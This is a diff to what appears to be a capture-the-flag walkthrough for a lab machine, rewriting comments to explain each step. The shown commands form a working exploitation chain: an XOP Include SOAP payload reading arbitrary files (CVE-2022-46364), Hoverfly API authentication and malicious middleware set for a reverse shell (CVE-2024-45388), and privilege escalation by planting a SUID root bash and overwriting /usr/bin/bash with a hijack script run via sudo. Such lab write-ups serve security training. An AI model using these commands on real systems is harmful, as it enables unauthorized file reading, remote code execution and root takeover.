@@ -493,8 +493,8 @@ sudo /opt/syswatch/syswatch.sh --version
 ### SOAP Request Template
 
 ```bash
-# What it does: send an HTTP request to the target service.
-# Why here: interact with the application logic or trigger a specific vulnerability.
+# What it does: send a crafted SOAP request with an XOP Include payload.
+# Why here: exploit CVE-2022-46364 to read arbitrary system files through the CXF employee service.
 curl -s -X POST http://TARGET:8080/employeeservice \
   -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<rootpart@soapui.org>"; start-info="text/xml"; boundary="MIMEBoundary"' \
   --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <rootpart@soapui.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n  <soapenv:Body>\r\n    <dev:submitReport>\r\n      <arg0>\r\n        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///TARGET_FILE"/></employeeName>\r\n        <department>x</department>\r\n        <content>x</content>\r\n        <confidential>false</confidential>\r\n      </arg0>\r\n    </dev:submitReport>\r\n  </soapenv:Body>\r\n</soapenv:Envelope>\r\n--MIMEBoundary--\r\n'
@@ -519,8 +519,8 @@ curl -s -X POST http://TARGET:8080/employeeservice \
 
 ```bash
 # Obtain JWT token
-# What it does: send an HTTP request to the target service.
-# Why here: interact with the application logic or trigger a specific vulnerability.
+# What it does: authenticate to the Hoverfly API using captured credentials.
+# Why here: obtain the JWT token required to access the administrative middleware configuration.
 curl -X POST http://TARGET:8888/api/token-auth \
   -H "Content-Type: application/json" \
   -d '{"username":"admin","password":"PASSWORD"}'
@@ -531,8 +531,8 @@ curl -X POST http://TARGET:8888/api/token-auth \
 ```bash
 # Set reverse shell middleware
 TOKEN="<JWT_TOKEN>"
-# What it does: send an HTTP request to the target service.
-# Why here: interact with the application logic or trigger a specific vulnerability.
+# What it does: configure a malicious middleware script in Hoverfly via the API.
+# Why here: leverage authenticated RCE (CVE-2024-45388) to gain a reverse shell as the service user.
 curl -s -X PUT http://TARGET:8888/api/v2/hoverfly/middleware \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
@@ -574,11 +574,11 @@ find / -perm -4000 -type f -name "bash" 2>/dev/null
 find / -perm -4000 -type f -name "sh" 2>/dev/null
 
 # Create SUID root shell
-# What it does: copy a binary or file to a temporary location.
-# Why here: prepare a payload or stage a binary for privilege escalation.
+# What it does: create a copy of the bash binary for SUID persistence.
+# Why here: stage a binary that will be granted elevated permissions during the privilege escalation process.
 cp /bin/bash /tmp/rootbash
-# What it does: set executable or SUID permissions.
-# Why here: ensure the payload can be executed with the necessary privileges.
+# What it does: set the SUID bit on the rootbash binary.
+# Why here: enable the execution of the bash shell with root privileges by any unprivileged user.
 chmod 4755 /tmp/rootbash
 /tmp/rootbash -p
 ```
@@ -587,8 +587,8 @@ chmod 4755 /tmp/rootbash
 
 ```bash
 # 1. Backup real bash
-# What it does: copy a binary or file to a temporary location.
-# Why here: prepare a payload or stage a binary for privilege escalation.
+# What it does: backup the original bash binary to a safe location.
+# Why here: preserve a functional shell for use in the hijack script shebang and for later restoration.
 cp /usr/bin/bash /tmp/bash.bak
 
 # 2. Switch to sh, kill bash processes
@@ -601,11 +601,11 @@ lsof /usr/bin/bash
 # Why here: leverage the sudo-run syswatch.sh to execute this script as root.
 cat > /usr/bin/bash << 'EOF'
 #!/tmp/bash.bak
-# What it does: copy a binary or file to a temporary location.
-# Why here: prepare a payload or stage a binary for privilege escalation.
+# What it does: copy the backed-up bash to a persistent SUID location.
+# Why here: create a root-owned SUID shell when the hijack script is executed via sudo.
 cp /tmp/bash.bak /tmp/rootbash
-# What it does: set executable or SUID permissions.
-# Why here: ensure the payload can be executed with the necessary privileges.
+# What it does: set the SUID bit on the newly created rootbash.
+# Why here: finalize the creation of the privilege escalation primitive.
 chmod 4755 /tmp/rootbash
 EOF
 
